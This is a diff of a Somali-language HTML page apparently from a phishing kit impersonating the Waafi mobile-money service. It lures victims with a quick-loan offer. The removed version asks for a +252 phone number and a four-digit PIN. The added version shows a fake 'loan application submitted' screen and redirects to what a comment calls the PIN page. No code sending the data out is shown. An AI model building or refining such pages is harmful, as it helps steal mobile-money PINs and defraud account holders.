@@ -1,82 +1,54 @@
 <!DOCTYPE html>
-<html lang="so">
+<html>
 <head>
-<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Waafi - PIN</title>
+<title>Codsiga Waa La Gudbiyay</title>
 
 <style>
 
 body{
-    margin:0;
-    font-family:Arial, sans-serif;
-    background:#7ed321;
+  margin:0;
+  font-family:Arial;
+  background:#f2f2f2;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
 }
 
-/* TOP BAR */
-.top{
-    background:#7ed321;
-    color:white;
-    text-align:center;
-    padding:25px 10px;
-    font-size:20px;
-    font-weight:bold;
-}
-
-/* CARD */
 .card{
-    background:white;
-    margin-top:-20px;
-    border-radius:25px 25px 0 0;
-    padding:30px 20px;
-    text-align:center;
+  width:90%;
+  max-width:420px;
+  background:white;
+  border-radius:20px;
+  padding:30px;
+  text-align:center;
+  box-shadow:0 4px 15px rgba(0,0,0,0.1);
 }
 
-/* NUMBER BOX */
-.number-box{
-    border:2px solid #7ed321;
-    border-radius:10px;
-    padding:15px;
-    margin:20px auto;
-    font-size:18px;
-    max-width:300px;
+.check{
+  width:80px;
+  height:80px;
+  background:#7ac943;
+  border-radius:50%;
+  margin:auto;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:white;
+  font-size:40px;
 }
 
-/* PIN INPUTS */
-.pin-container{
-    display:flex;
-    justify-content:center;
-    gap:15px;
-    margin:20px 0;
+h2{
+  color:#7ac943;
 }
 
-.pin{
-    width:55px;
-    height:55px;
-    border:2px solid #7ed321;
-    border-radius:10px;
-    text-align:center;
-    font-size:24px;
-}
-
-/* BUTTON */
-button{
-    width:100%;
-    padding:15px;
-    border:none;
-    border-radius:10px;
-    background:#ccc;
-    color:white;
-    font-size:18px;
-    margin-top:25px;
-}
-
-.footer{
-    text-align:center;
-    color:white;
-    padding:30px;
-    font-size:20px;
+.loading{
+  margin-top:25px;
+  background:#eee;
+  padding:20px;
+  border-radius:12px;
+  color:#7ac943;
 }
 
 </style>
@@ -84,62 +56,29 @@ button{
 
 <body>
 
-<div class="top">
-Amaahado Sahlan oo Degdeg ah
-</div>
-
 <div class="card">
 
-<h2>Gal</h2>
+<div class="check">✓</div>
 
-<div class="number-box" id="phoneDisplay">
-+252
+<h2>Codsiga Amaahda waa la gudbiyay</h2>
+
+<p>
+Codsigaaga amaahda waa la gudbiyay.  
+Fadlan sug ansixinta.
+</p>
+
+<div class="loading">
+Ku celinaya galitaanka Waafi 4 ilbiriqsi...
 </div>
 
-<p>Geli PIN-kaaga</p>
-
-<div class="pin-container">
-<input class="pin" maxlength="1" type="password">
-<input class="pin" maxlength="1" type="password">
-<input class="pin" maxlength="1" type="password">
-<input class="pin" maxlength="1" type="password">
-</div>
-
-<p>PIN-ka ma iloobtay?</p>
-
-<button onclick="goNext()">GAL</button>
-
-</div>
-
-<div class="footer">
-Waafi<br>
-Amaahado Sahlan oo Degdeg ah
 </div>
 
 <script>
 
-/* GET NUMBER FROM PREVIOUS PAGE */
-const phone = localStorage.getItem("phoneNumber");
-
-if(phone){
-    document.getElementById("phoneDisplay").innerText = phone;
-}
-
-/* AUTO MOVE BETWEEN PIN BOXES */
-const pins = document.querySelectorAll(".pin");
-
-pins.forEach((input,index)=>{
-    input.addEventListener("input",()=>{
-        if(input.value.length === 1 && index < pins.length-1){
-            pins[index+1].focus();
-        }
-    });
-});
-
-/* NEXT PAGE */
-function goNext(){
-    window.location.href="page6.html";
-}
+/* WAIT 5 SECONDS THEN OPEN PIN PAGE */
+setTimeout(function(){
+   window.location.href = "page6.html";
+},5000);
 
 </script>
 
